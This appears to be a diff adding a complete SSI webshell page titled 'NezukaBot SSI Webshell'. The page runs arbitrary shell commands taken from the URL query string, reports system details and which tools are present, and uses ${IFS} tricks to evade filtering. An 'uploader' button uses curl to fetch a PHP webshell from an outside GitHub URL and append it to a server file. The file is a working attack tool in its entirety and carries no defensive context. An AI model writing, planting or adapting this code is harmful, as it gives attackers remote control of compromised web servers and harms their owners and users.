@@ -1,0 +1,59 @@
+<!--#config errmsg="Function SSI Disabled"-->
+<!--#set var="zero" value="" -->
+<!--#if expr="$QUERY_STRING_UNESCAPED = \$zero" -->
+<!--#set var="shl" value="whoami" -->
+<!--#else -->
+<!--#set var="shl" value=$QUERY_STRING_UNESCAPED -->
+<!--#endif -->
+<!DOCTYPE html>
+<html>
+<head>
+<title>NezukaBot SSI Webshell</title>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+<script language="javascript">
+function nezcmd()
+{
+  var uri = document.getElementById('command').value;
+	var rep = uri.replace(/[ ]/g,'${IFS}');
+	var res = encodeURI(uri);
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+encodeURI(rep);
+}
+
+function addupload()
+{
+	document.location.href="<!--#echo var=DOCUMENT_NAME -->?"+"curl${IFS}-Ls${IFS}raw.githubusercontent.com/AzhariKun/webshell/main/nez.php${IFS}|${IFS}tee${IFS}-a${IFS}nez.php";
+}
+</script>
+<style type="text/css">
+	.input {
+		background: transparent;
+		border-color: #ffffff;
+		border-width: thin;
+		border: groove;
+		cursor: pointer;
+	}
+
+	button {
+		cursor: pointer;
+	}
+</style>
+</head>
+<b><font face="courier" size="4"><i>NezukaBot SSI Webshell</font></b><font face="courier">
+	<br><br>System : <b><!--#exec cmd="{uname,-nrv}" --></b>
+	<br>Current Path : <b><!--#echo var=DOCUMENT_ROOT --></b></i><br><br>
+	MySql : <b><!--#exec cmd="{test,-e,/usr/bin/mysql}&&{echo,ON}||{echo,OFF}" --></b>&nbsp;|&nbsp; Wget : <b><!--#exec cmd="{test,-e,/usr/bin/wget}&&{echo,ON}||{echo,OFF}" --></b></b>&nbsp;|&nbsp; Curl : <b><!--#exec cmd="{test,-e,/usr/bin/curl}&&{echo,ON}||{echo,OFF}" --></b><br>
+	<font> COMMAND : <input type="text" size="30" id="command" class="text" name="address1" style="max-width: 100%; max-height: 100%;">&nbsp;<button class="input" id="gas" onclick="nezcmd();">execute</button> <button class="input" id="gas" onclick="addupload();">uploader</button><br><br>
+Executed Command : </font><b><font face="courier" id="cmd"><!--#echo var=shl --></font></b></i>
+<pre><!--#exec cmd=$shl --></pre>
+<script>
+  var cmd = document.getElementById("cmd").innerHTML.split("${IFS}").join(" ");
+	document.getElementById("cmd").innerHTML = cmd;
+	var gaskan = document.getElementById("command");
+	gaskan.addEventListener("keyup", function(event) {
+	  if (event.keyCode === 13) {
+	    event.preventDefault();
+	    document.getElementById("gas").click();
+	}
+});
+</script>
+</html>
